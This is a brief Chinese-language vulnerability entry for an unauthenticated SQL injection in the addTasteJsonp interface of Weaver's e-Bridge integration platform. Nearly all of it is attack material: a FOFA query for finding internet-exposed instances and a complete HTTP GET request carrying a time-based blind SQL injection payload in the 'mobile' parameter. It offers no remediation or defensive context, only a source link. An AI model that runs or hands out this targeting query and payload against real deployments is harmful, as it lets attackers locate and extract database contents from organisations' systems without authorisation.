# 泛微云桥e-Bridge系统接口addTasteJsonp存在SQL注入漏洞

泛微云桥e-Bridge是在“互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成平台。

泛微-云桥e-Bridge addTasteJsonp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息

## fofa

```javascript
app="泛微云桥e-Bridge"
```

## poc

```javascript
GET /taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27+AND+%28SELECT+6488+FROM+%28SELECT%28SLEEP%285%29%29%29CvMg%29+OR+%27JmLq%27%3D%27IpuI HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412191452651.webp)

## 漏洞来源

- https://mp.weixin.qq.com/s/Ej26hywx4po4sj3dSAVI_Q